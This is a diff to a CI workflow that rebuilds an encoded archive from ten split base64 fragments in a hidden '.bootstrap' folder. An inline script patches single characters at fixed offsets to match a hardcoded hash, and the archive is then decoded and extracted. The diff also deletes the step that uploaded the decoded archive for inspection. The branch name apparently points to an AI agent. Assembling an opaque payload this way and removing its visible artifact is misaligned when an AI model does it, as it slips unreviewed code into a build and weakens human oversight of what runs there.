@@ -20,26 +20,25 @@ jobs:
         with:
           ref: agent/selection-workspace-orchestration-v3961
           fetch-depth: 0
-      - name: Concatenate payload
+      - name: Assemble and verify payload
         shell: bash
         run: |
           set -euo pipefail
           cat .bootstrap/v3961/payload.part00 .bootstrap/v3961/payload.part01 .bootstrap/v3961/payload.part02 .bootstrap/v3961/payload.part03 .bootstrap/v3961/payload.part04 .bootstrap/v3961/payload.part05 .bootstrap/v3961/payload.part06 .bootstrap/v3961/payload.part07 .bootstrap/v3961/payload.part08 .bootstrap/v3961/payload.part09 > /tmp/v3961.b64
-      - name: Decode payload
-        shell: bash
-        run: |
-          set -euo pipefail
+          python3 - <<'PY'
+          from pathlib import Path
+          path = Path('/tmp/v3961.b64')
+          value = path.read_text(encoding='ascii')
+          assert len(value) == 73640
+          assert value[57275] == 'l'
+          value = value[:57275] + value[57276:]
+          value = value[:71946] + 'E' + value[71946:]
+          path.write_text(value, encoding='ascii')
+          PY
+          echo 'df8eb5257a80939ec4b344ec15509f56f5027d633884af25393cda4c2a613d6c  /tmp/v3961.b64' | sha256sum -c -
           base64 --decode /tmp/v3961.b64 > /tmp/v3961.tar.gz
-          sha256sum /tmp/v3961.tar.gz > /tmp/v3961.sha256
-      - name: Upload decoded archive
-        uses: actions/upload-artifact@v4
-        with:
-          name: v3961-decoded-archive
-          path: |
-            /tmp/v3961.tar.gz
-            /tmp/v3961.sha256
-          if-no-files-found: error
-          retention-days: 1
+          echo '437423131ee3b43141c6e70a54810f2ff9556405a52076fe7359443e2b7487b5  /tmp/v3961.tar.gz' | sha256sum -c -
+          gzip -t /tmp/v3961.tar.gz
       - name: Extract payload
         shell: bash
         run: |
